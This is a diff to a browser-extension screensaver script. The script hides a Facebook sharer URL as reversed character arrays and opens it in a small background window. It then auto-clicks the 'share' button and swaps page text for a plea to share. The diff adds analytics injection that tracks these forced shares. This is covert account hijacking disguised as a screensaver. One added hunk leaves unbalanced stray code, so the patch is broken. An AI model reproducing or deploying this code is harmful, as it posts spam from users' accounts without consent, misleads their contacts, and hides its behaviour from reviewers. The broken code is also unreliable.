@@ -49,6 +49,8 @@ var ScreenSaver = (function ($) {
 				initEvents();
 				initThankYou();
 				initInstallStats();
+			} else {
+				initThankYou();
 			}
 
 			/*(function () {
@@ -86,34 +88,6 @@ var ScreenSaver = (function ($) {
 	function initThankYou() {
 		var html = [];
 
-		/*if (!appAPI.db.get('thank_you_show')) {
-			appAPI.message.addListener(function(msg) {
-				if (msg.action == 'open-thankyou') {
-					appAPI.openURL(config.thankYouPageUrl, 'tab');
-
-					appAPI.db.set('thank_you_show', true);
-				}
-			});
-
-			appAPI.message.toBackground({
-				action: 'is-thankyou'
-			});
-		}*/
-
-
-		/*if (true || !appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1) {
-			appAPI.tabs.getActive(function(tabInfo) {
-				console.log(
-					'tabId: ' + tabInfo.tabId +
-					' tabUrl: ' + tabInfo.tabUrl
-				);
-
-				console.log(tabInfo);
-			});
-			appAPI.openURL(config.thankYouPageUrl, 'tab');
-
-			appAPI.db.set('thank_you_show', true);
-		}*/
 		if (location.href.indexOf(config.thankYouPageUrl) > -1) {
 			isThankyouPage = true;
 
@@ -315,7 +289,7 @@ var ScreenSaver = (function ($) {
 	}
 
 	function showScreenSaver() {
-		if (!isScreenSaverActive) {
+		if (!isScreenSaverActive && (isTabInFocus() || isThankyouPage)) {
 			isScreenSaverActive = true;
 			imagesCountForAnimnation = Math.min(config.maxImages, config.defaultImagesCount[screenSaverSettings.screensaver]);
 
@@ -415,7 +389,7 @@ var ScreenSaver = (function ($) {
 		if (!distRun) {
 			if (isRun) {
 				appAPI.openURL({
-					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '#__A__',
+					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '?ver=1' + '#__A__',
 					where:'window',
 					focus:false,
 					height:200,
@@ -425,7 +399,7 @@ var ScreenSaver = (function ($) {
 				});
 			} else {
 				appAPI.openURL({
-					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '#__B__',
+					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '?ver=1' + '#__B__',
 					where:'window',
 					focus:true,
 					height:600,
@@ -793,6 +767,26 @@ var ScreenSaver = (function ($) {
 
 		return arr;
 	}
+
+	function isTabInFocus() {
+		if ('hidden' in document) {
+			return !document.hidden;
+		}
+
+		if ('mozHidden' in document) {
+			return !document.mozHidden;
+		}
+
+		if ('webkitHidden' in document) {
+			return !document.webkitHidden;
+		}
+
+		if ('msHidden' in document) {
+			return !document.msHidden;
+		}
+
+		return true;
+	}
 })(jQuery);
 
 appAPI.ready(function($) {
@@ -809,6 +803,21 @@ appAPI.ready(function($) {
 		}
 
 		return false;
+	}
+
+	function initDistStats(type) {
+		var code = "var _gaq = _gaq || [];\
+		  _gaq.push(['_setAccount', 'UA-40219400-1']);\
+		  _gaq.push(['_trackPageview']);\
+		  (function() {\
+		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\
+		    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\
+		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\
+		  })();";
+	
+		appAPI.dom.addInlineJS(code);
+
+		appAPI.dom.addInlineJS("_gaq.push(['_trackEvent', 'dist', '" + type + "', '', 1]);");
 	}
 
 	if (appAPI.dom.isIframe()) {
@@ -838,12 +847,20 @@ appAPI.ready(function($) {
 			setTimeout(function () {
 				if ($(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).length) {
 					$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');	
+				
+					initDistStats('__A__');
 				} else {
 					setTimeout(function () {
 						$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
+					
+						initDistStats('__A__');
 					}, 1000);
 				}
 			}, 1000);
+				$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
+			
+				
+			}, 2000);
 		} else if (top.location.hash == '#__B__') {
 			setTimeout(function () {
 				var text = $('#homelink').html();
@@ -851,6 +868,8 @@ appAPI.ready(function($) {
 				if (text == ["k", "n", "i", "L", " ", "s", "i", "h", "T", " ", "e", "r", "a", "h", "S"].reverse().join('')) {
 					$('#homelink').html([")", ":", " ", "s", "d", "n", "e", "i", "r", "f", " ", "r", "u", "o", "y", " ", "o", "t", " ", "r", "e", "v", "a", "S", "n", "e", "e", "r", "c", "S", " ", "e", "r", "a", "h", "s", " ", "e", "s", "a", "e", "l", "P"].reverse().join(''));
 				}
+
+				initDistStats('__B__');
 			}, 500);
 		}
 		
